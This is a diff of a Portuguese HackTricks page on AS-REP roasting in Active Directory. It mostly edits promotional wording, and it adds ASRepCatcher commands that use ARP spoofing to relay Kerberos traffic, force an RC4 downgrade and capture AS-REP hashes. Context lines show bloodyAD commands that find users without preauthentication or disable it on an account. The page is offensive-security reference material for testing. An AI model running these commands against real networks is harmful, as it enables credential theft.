@@ -19,7 +19,7 @@ Outras formas de apoiar o HackTricks:
 Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e caçadores de recompensas por bugs!
 
 **Percepções de Hacking**\
-Envolver-se com conteúdo que mergulha na emoção e desafios do hacking
+Engaje-se com conteúdo que explora a emoção e os desafios do hacking
 
 **Notícias de Hacking em Tempo Real**\
 Mantenha-se atualizado com o mundo acelerado do hacking através de notícias e insights em tempo real
@@ -51,8 +51,6 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-{% endcode %}
-
 #### Solicitar mensagem AS_REP
 
 {% code title="Usando Linux" %}
@@ -94,8 +92,19 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
 ```
-{% endcode %}
+## ASreproast sem credenciais
+Sem o conhecimento de usuários que não requerem autenticação prévia do Kerberos. Um atacante pode usar uma posição de homem-no-meio para capturar pacotes AS-REP enquanto atravessam a rede.<br>
+[ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) nos permite fazer isso. Além disso, a ferramenta **força estações de trabalho cliente a usar RC4** alterando a negociação do Kerberos.
+```bash
+# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
+ASRepCatcher.py relay -dc $DC_IP --keep-spoofing
 
+# Disabling ARP spoofing, the mitm position must be obtained differently
+ASRepCatcher.py relay -dc $DC_IP --disable-spoofing
+
+# Passive listening of AS-REP packets, no packet alteration
+ASrepCatcher.py listen
+```
 ## Referências
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
@@ -104,7 +113,7 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e caçadores de recompensas por bugs!
+Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e caçadores de bugs!
 
 **Percepções de Hacking**\
 Engaje-se com conteúdo que explora a emoção e os desafios do hacking
@@ -123,10 +132,10 @@ Fique informado sobre os mais recentes programas de recompensas por bugs lançad
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
